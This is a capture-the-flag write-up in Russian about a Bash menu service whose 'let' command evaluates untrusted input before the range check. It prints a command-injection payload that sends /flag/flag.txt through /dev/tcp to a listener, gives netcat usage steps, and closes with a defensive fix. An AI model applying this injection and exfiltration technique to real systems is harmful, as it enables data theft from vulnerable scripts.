# Bish Bash Bosh: подстановка команды до проверки диапазона

[English](solve.md)

## 0. Условие

Блокнот Bash с меню: выбрать номер 0–2, получить один из трёх файлов с текстом. В ZIP есть `server.sh`, `entrypoint.sh`, Dockerfile, compose и сохранённые команды. Флаг находится в `/flag/flag.txt`.

Ошибка в последовательности: пользовательскую строку сначала отдают **арифметическому парсеру Bash**, а уже потом проверяют диапазон.

## 1. Исходник

```bash
files=(
  "/flag/flag.txt"
  "msg1"
  "msg2"
  "msg3"
)

echo "What message would you like to see? (0..2)"
read -r i
let i=$i-1

if (( i < 1 || i > 3 )); then
  echo "Nuh uh"
  exit 1
fi

file="\${files[i]}"
cat -- "$file"
```

Номинально доступны `files[1]`, `files[2]`, `files[3]`. `files[0]` — флаг, но просто отправить `0` не поможет: после `let` получается `-1`, которое отсекает `if`. Необычный текст тоже не обязан превращаться в допустимое число.

Нужно обратить внимание на строку `let i=$i-1`: сюда попадает не «целое число», а **выражение**, которое Bash будет разбирать с учётом переменных, массивов и подстановок команд.

## 2. Сохранённая попытка и проверенное исправление

В `evidence/solve_*.txt` сохранена **попытка** с такой строкой:

```bash
x[$(cat /flag/flag.txt > /dev/tcp/<listener>/4444)]
```

Называть эту запись подтверждённо рабочим payload **неправильно**. В `server.sh` выполняется `let i=$i-1`, причём `$i` не заключена в кавычки. Пробелы приводят к **разделению аргументов оболочкой** ещё до передачи выражения встроенной команде `let`. Локальная проверка показала ошибку `bad array subscript` без выполнения нужной подстановки. Сохранившийся журнал содержит команды попыток, но не подтверждает успешную отправку файла именно этой строкой.

Проверенная версия **без пробелов**:

```bash
x[$(cat</flag/flag.txt>/dev/tcp/<listener>/4444)]
```

Перенаправления ввода и вывода не требуют разделения пробелами. Поэтому вся строка попадает в арифметический парсер одним аргументом, а подстановка `$(...)` внутри индекса массива `x[...]` может выполниться **до** проверки диапазона меню. Конечное значение `i` несущественно.

Разницу между двумя формами независимо проверили на Bash с **безопасной записью локального файла**, без сетевого подключения и чтения флагов. Тест: [`scripts/verify_local.sh`](scripts/verify_local.sh). Флаг соревнования был принят, но точная историческая успешная команда в архиве не сохранилась; исправленная строка здесь представлена как проверенная реконструкция, а не цитата из завершившегося сеанса.

## 3. Воспроизводимый порядок

1. На доступном из CTF контейнера адресе запустить `nc -lvnp 4444`.
2. Подключиться к TCP-сервису и дождаться `What message would you like to see? (0..2)`.
3. Отправить строку payload с адресом слушателя вместо `<listener>`.
4. Посмотреть данные, пришедшие на слушатель.
5. Отправить найденный флаг платформе. Возможный вывод `Nuh uh` после выполнения выражения не отменяет отправку файла.

В репозитории адрес слушателя и сам флаг скрыты. Сохранившаяся строка с пробелами не была подтверждена работающей. Исправленная форма без пробелов проверена локально, а назначение файлов подтверждается исходником.

## 4. Почему проверка не защищает

Проверка `i<1 || i>3` выполняется **после** вычисления недоверенного `i`. Для Bash арифметические выражения — не пассивная конвертация строки в integer. Они могут содержать вложенные конструкции с действиями вне самой проверки диапазона.

Это ошибка уровня интерпретатора, а не «разрешённый индекс -1».

## 5. Защита

Проверять, что вход — ровно строка `0`, `1` или `2`, **до** любых арифметических вычислений. Для трёх вариантов проще использовать `case` без `let` и без вычисления произвольных пользовательских выражений. Логи полного интерактивного сеанса не сохранились, но `server.sh` и журнал попыток находятся в архиве; рабочая форма без пробелов проверена отдельно.
